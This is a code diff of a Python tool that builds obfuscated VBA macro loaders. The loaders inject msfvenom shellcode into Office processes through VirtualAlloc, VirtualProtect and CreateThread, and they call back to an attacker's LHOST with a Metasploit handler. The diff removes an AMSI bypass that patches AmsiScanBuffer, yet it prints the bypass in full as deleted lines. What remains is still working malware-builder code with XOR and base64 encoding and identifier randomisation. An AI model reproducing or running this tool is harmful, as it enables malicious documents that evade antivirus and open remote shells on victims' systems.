@@ -84,19 +84,13 @@ exploit -j
 VBA_DECL_X86 = """\
 Option Explicit
 
-Private Declare PtrSafe Function {fn_ll} Lib "KERNEL32" Alias "LoadLibraryA" _
-    (ByVal lpLibFileName As String) As LongPtr
-
-Private Declare PtrSafe Function {fn_gpa} Lib "KERNEL32" Alias "GetProcAddress" _
-    (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
-
 Private Declare PtrSafe Function {fn_vp} Lib "KERNEL32" Alias "VirtualProtect" _
     (ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
      ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
 
 Private Declare PtrSafe Function {fn_ct} Lib "KERNEL32" Alias "CreateThread" _
     (ByVal SecurityAttributes As Long, ByVal StackSize As Long, _
-     ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, _
+     ByVal StartFunction As LongPtr, ByVal ThreadParameter As LongPtr, _
      ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
 
 Private Declare PtrSafe Function {fn_va} Lib "KERNEL32" Alias "VirtualAlloc" _
@@ -110,12 +104,6 @@ Private Declare PtrSafe Sub {fn_rmm} Lib "KERNEL32" Alias "RtlMoveMemory" _
 
 VBA_DECL_X64 = """\
 Option Explicit
-
-Private Declare PtrSafe Function {fn_ll} Lib "KERNEL32" Alias "LoadLibraryA" _
-    (ByVal lpLibFileName As String) As LongPtr
-
-Private Declare PtrSafe Function {fn_gpa} Lib "KERNEL32" Alias "GetProcAddress" _
-    (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
 
 Private Declare PtrSafe Function {fn_vp} Lib "KERNEL32" Alias "VirtualProtect" _
     (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
@@ -143,45 +131,6 @@ Private Function {fn_b64}(ByVal s As String) As Byte()
     n.Text = s
     {fn_b64} = n.nodeTypedValue
 End Function
-"""
-
-VBA_AMSI_SUB_X86 = """
-Private Sub {fn_amsi}()
-    On Error Resume Next
-    Dim {v_hm} As LongPtr
-    {v_hm} = {fn_ll}("amsi.dll")
-    If {v_hm} = 0 Then Exit Sub
-    Dim {v_pa} As LongPtr
-    {v_pa} = {fn_gpa}({v_hm}, "AmsiScanBuffer")
-    If {v_pa} = 0 Then Exit Sub
-    Dim {v_oldp} As Long
-    {fn_vp} {v_pa}, 8, &H40, {v_oldp}
-    Dim {v_pb}(0 To 7) As Byte
-    {v_pb}(0) = &HB8: {v_pb}(1) = &H57: {v_pb}(2) = &H0
-    {v_pb}(3) = &H7: {v_pb}(4) = &H80: {v_pb}(5) = &HC2
-    {v_pb}(6) = &H18: {v_pb}(7) = &H0
-    {fn_rmm} {v_pa}, {v_pb}(0), 8
-    {fn_vp} {v_pa}, 8, {v_oldp}, {v_oldp}
-End Sub
-"""
-
-VBA_AMSI_SUB_X64 = """
-Private Sub {fn_amsi}()
-    On Error Resume Next
-    Dim {v_hm} As LongPtr
-    {v_hm} = {fn_ll}("amsi.dll")
-    If {v_hm} = 0 Then Exit Sub
-    Dim {v_pa} As LongPtr
-    {v_pa} = {fn_gpa}({v_hm}, "AmsiScanBuffer")
-    If {v_pa} = 0 Then Exit Sub
-    Dim {v_oldp} As Long
-    {fn_vp} {v_pa}, 6, &H40, {v_oldp}
-    Dim {v_pb}(0 To 5) As Byte
-    {v_pb}(0) = &HB8: {v_pb}(1) = &H57: {v_pb}(2) = &H0
-    {v_pb}(3) = &H7: {v_pb}(4) = &H80: {v_pb}(5) = &HC3
-    {fn_rmm} {v_pa}, {v_pb}(0), 6
-    {fn_vp} {v_pa}, 6, {v_oldp}, {v_oldp}
-End Sub
 """
 
 VBA_XOR_SUB = """
@@ -258,10 +207,9 @@ End Sub
 """
 
 COMMON_KEYS = [
-    "fn_ll", "fn_gpa", "fn_vp", "fn_ct", "fn_va", "fn_rmm",
-    "fn_b64", "fn_amsi", "fn_xor", "fn_exec", "fn_main",
+    "fn_vp", "fn_ct", "fn_va", "fn_rmm",
+    "fn_b64", "fn_xor", "fn_exec", "fn_main",
     "v_blob", "v_key", "v_data", "v_kb",
-    "v_hm", "v_pa", "v_oldp", "v_pb",
     "v_i",
     "v_addr", "v_prot",
 ]
@@ -270,24 +218,17 @@ X86_EXTRA_KEYS = ["v_c", "v_tmp"]
 X64_EXTRA_KEYS = ["v_sz", "v_tid"]
 
 
-def build_template(arch: str, amsi: bool) -> str:
+def build_template(arch: str) -> str:
     parts = []
     parts.append(VBA_DECL_X86 if arch == "x86" else VBA_DECL_X64)
     parts.append(VBA_B64_FUNC)
-    if amsi:
-        parts.append(VBA_AMSI_SUB_X86 if arch == "x86" else VBA_AMSI_SUB_X64)
     parts.append(VBA_XOR_SUB)
     parts.append(VBA_EXEC_X86 if arch == "x86" else VBA_EXEC_X64)
-
-    main_header = "Function {fn_main}()\n"
-    if amsi:
-        main_header += "    {fn_amsi}\n\n"
-    parts.append("\n" + main_header + VBA_MAIN_BODY)
-
+    parts.append("\nFunction {fn_main}()\n" + VBA_MAIN_BODY)
     return "\n".join(parts)
 
 
-def build_vba(shellcode: bytes, rng: random.Random, arch: str, amsi: bool = True) -> str:
+def build_vba(shellcode: bytes, rng: random.Random, arch: str) -> str:
     key = secrets.token_bytes(16)
     xored = xor_encode(shellcode, key)
     blob_b64 = base64.b64encode(xored).decode()
@@ -301,39 +242,33 @@ def build_vba(shellcode: bytes, rng: random.Random, arch: str, amsi: bool = True
     mapping["blob_assign"] = vba_string_literal(mapping["v_blob"], blob_b64)
     mapping["key_assign"] = vba_string_literal(mapping["v_key"], key_b64)
 
-    template = build_template(arch, amsi)
+    template = build_template(arch)
     vba = template.format(**mapping)
 
     print(f"[+] Arch:            {arch}", file=sys.stderr)
-    print(f"[+] AMSI bypass:     {'yes' if amsi else 'no'}", file=sys.stderr)
     print(f"[+] Memory:          RW -> RX (VirtualProtect)", file=sys.stderr)
     print(f"[+] Execution:       CreateThread (async)", file=sys.stderr)
     print(f"[+] XOR key (hex):   {key.hex()}", file=sys.stderr)
     print(f"[+] Main routine:    {mapping['fn_main']}", file=sys.stderr)
     print(f"[+] CreateThread as: {mapping['fn_ct']}", file=sys.stderr)
-    if amsi:
-        print(f"[+] AMSI bypass as:  {mapping['fn_amsi']}", file=sys.stderr)
     return vba
 
 
 def main():
     ap = argparse.ArgumentParser(
-        description="Build VBA loader v2 (AMSI bypass, RW->RX, split logic)",
+        description="Build VBA loader (RW->RX, split logic)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 EXAMPLES:
 
-  x64 Office with AMSI bypass:
-    python3 build_vba_v2.py --arch x64 --lhost 192.168.x.x --lport 443
+  x64 Office:
+    python3 build_vba.py --arch x64 --lhost 192.168.x.x --lport 443
 
-  x86 Office without AMSI bypass:
-    python3 build_vba_v2.py --arch x86 --lhost 192.168.x.x --no-amsi
-
-  Generate handler .rc file:
-    python3 build_vba_v2.py --arch x64 --lhost 192.168.x.x --handler
+  x86 Office:
+    python3 build_vba.py --arch x86 --lhost 192.168.x.x
 
   Reproducible build:
-    python3 build_vba_v2.py --arch x64 --lhost 192.168.x.x --seed 42
+    python3 build_vba.py --arch x64 --lhost 192.168.x.x --seed 42
         """,
     )
     ap.add_argument("--arch", choices=["x86", "x64"], required=True,
@@ -347,8 +282,6 @@ EXAMPLES:
     ap.add_argument("-o", "--output", default="loader.vba", help="Output .vba path")
     ap.add_argument("--seed", type=int, default=None,
                     help="Seed for identifier randomization (omit for fully random)")
-    ap.add_argument("--no-amsi", action="store_true",
-                    help="Disable AMSI bypass")
     ap.add_argument("--no-handler", action="store_true",
                     help="Do not generate Metasploit handler .rc file")
     args = ap.parse_args()
@@ -364,7 +297,7 @@ EXAMPLES:
         print(f"[+] Loaded {len(sc)} bytes from {args.shellcode}", file=sys.stderr)
     else:
         sc = run_msfvenom(args.lhost, args.lport, payload)
-    vba = build_vba(sc, rng, args.arch, amsi=not args.no_amsi)
+    vba = build_vba(sc, rng, args.arch)
 
     Path(args.output).write_text(vba)
     print(f"[+] Wrote {args.output} ({len(vba)} chars)", file=sys.stderr)
